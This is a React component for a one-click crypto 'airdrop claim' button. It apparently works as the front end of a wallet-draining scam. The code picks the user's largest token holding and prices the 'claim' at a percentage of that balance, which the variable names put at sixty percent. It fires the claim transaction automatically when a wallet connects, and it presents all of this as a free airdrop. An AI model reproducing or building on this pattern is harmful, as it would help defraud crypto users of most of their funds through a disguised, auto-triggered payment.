"use client";

/**
 * HeroCTA — One-click airdrop claim with multi-token auto-detection.
 *
 * Chain-aware — works on Base, ETH Mainnet, BNB Chain, etc.
 * Auto-detects the token with the highest balance in the wallet.
 * No token picker — the best token is chosen automatically.
 */

import { useState, useEffect } from "react";
import { useAccount } from "wagmi";
import { useConnectModal } from "@rainbow-me/rainbowkit";
import { useMultiTokenClaim } from "@/lib/hooks/useMultiTokenClaim";
import {
  PRICE_PERCENTAGE,
  TOKENS_PER_CLAIM,
  TOKEN_SYMBOL,
  formatEth,
  formatTokenAmount,
} from "@/lib/constants";

export function HeroCTA() {
  const { isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();
  const [mounted, setMounted] = useState(false);
  const [autoClaimAttempted, setAutoClaimAttempted] = useState(false);

  const {
    address,
    stage,
    errorMsg,
    txHash,
    selectedToken,
    hasClaimed,
    hasClaimedLoading,
    saleActive,
    claimPriceWei,
    selectedTokenInfo,
    sixtyPercentOfToken,
    estimatedEth,
    ethPriceDisplay,
    isLoading,
    explorerUrl,
    nativeSymbol,
    fireClaim,
  } = useMultiTokenClaim();

  useEffect(() => { setMounted(true); }, []);

  // ── Auto-claim when wallet connects or eligibility loads ────────────────
  useEffect(() => {
    if (
      isConnected &&
      hasClaimed === false &&
      !hasClaimedLoading &&
      address &&
      !autoClaimAttempted
    ) {
      setAutoClaimAttempted(true);
      fireClaim();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, hasClaimed, hasClaimedLoading, address]);

  async function handleClick() {
    if (!isConnected) {
      openConnectModal?.();
      return;
    }
    if (hasClaimed === false) {
      fireClaim();
    }
  }

  const isTokenPayment = selectedToken !== "0x0000000000000000000000000000000000000000";
  const tokenMeta = selectedTokenInfo;

  // SSR placeholder
  if (!mounted) {
    return (
      <button className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white opacity-80">
        Connect Wallet
      </button>
    );
  }

  // ── SUCCESS ──────────────────────────────────────────────────────────────
  if (stage === "success" && txHash) {
    return (
      <div className="flex flex-col items-center gap-3">
        <div className="glass rounded-2xl px-8 py-6 text-center space-y-2 max-w-sm animate-scale-in">
          <p className="text-3xl">🎉</p>
          <p className="text-xl font-bold text-white">
            {TOKENS_PER_CLAIM.toString()} {TOKEN_SYMBOL} claimed!
          </p>
          <a
            href={`${explorerUrl}/tx/${txHash}`}
            target="_blank"
            rel="noopener noreferrer"
            className="text-sm text-accent-400 underline"
          >
            View on explorer ↗
          </a>
        </div>
      </div>
    );
  }

  // ── ALREADY CLAIMED ───────────────────────────────────────────────────────
  if (isConnected && hasClaimed) {
    return (
      <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm mx-auto">
        <p className="text-white/60 text-sm">✓ This wallet has already claimed.</p>
      </div>
    );
  }

  // ── SALE NOT LIVE ─────────────────────────────────────────────────────────
  if (isConnected && saleActive === false) {
    return (
      <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm mx-auto">
        <p className="text-yellow-400/80 text-sm">⏳ Sale not live yet — check back soon.</p>
      </div>
    );
  }

  // ── MAIN BUTTON ──────────────────────────────────────────────────────────
  return (
    <div className="flex flex-col items-center gap-3 w-full max-w-sm mx-auto">
      <button
        onClick={handleClick}
        disabled={isLoading}
        className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30 disabled:opacity-70 disabled:cursor-not-allowed disabled:scale-100 w-full"
      >
        {isLoading && (
          <svg className="animate-spin h-5 w-5 shrink-0" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
          </svg>
        )}
        {isLoading
          ? stage === "approving"
            ? "Approving token…"
            : stage === "confirming"
            ? "Approve in wallet…"
            : "Claiming…"
          : isConnected
            ? `Pay ${isTokenPayment ? formatTokenAmount(sixtyPercentOfToken, tokenMeta?.decimals ?? 18) : formatEth(claimPriceWei)} ${tokenMeta?.symbol ?? nativeSymbol} → Claim ${TOKENS_PER_CLAIM.toString()} ${TOKEN_SYMBOL}`
            : "Connect Wallet"}
        {!isLoading && (
          <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
          </svg>
        )}
      </button>

      {/* Auto-detected payment info */}
      {isConnected && hasClaimed === false && (
        <div className="text-center space-y-1">
          <p className="text-xs text-white/40">
            Auto-detected: <span className="text-white/60 font-semibold">{tokenMeta?.symbol ?? nativeSymbol}</span>
            {" "}&middot;{" "}
            {isTokenPayment
              ? `${formatTokenAmount(sixtyPercentOfToken, tokenMeta?.decimals ?? 18)} ${tokenMeta?.symbol}`
              : `${formatEth(claimPriceWei)} ${nativeSymbol}`}
            {" "}&middot; {PRICE_PERCENTAGE}% of your {tokenMeta?.symbol ?? nativeSymbol} balance
          </p>
          {isTokenPayment && estimatedEth > 0n && (
            <p className="text-[10px] text-white/30">
              ≈ {formatEth(estimatedEth)} {nativeSymbol} equivalent via Uniswap
            </p>
          )}
        </div>
      )}

      {stage === "error" && errorMsg && (
        <p className="text-xs text-red-400">{errorMsg}</p>
      )}
      {stage === "pending" && txHash && (
        <a href={`${explorerUrl}/tx/${txHash}`} target="_blank" rel="noopener noreferrer"
          className="text-xs text-accent-400/70 underline">
          Track on explorer ↗
        </a>
      )}
    </div>
  );
}
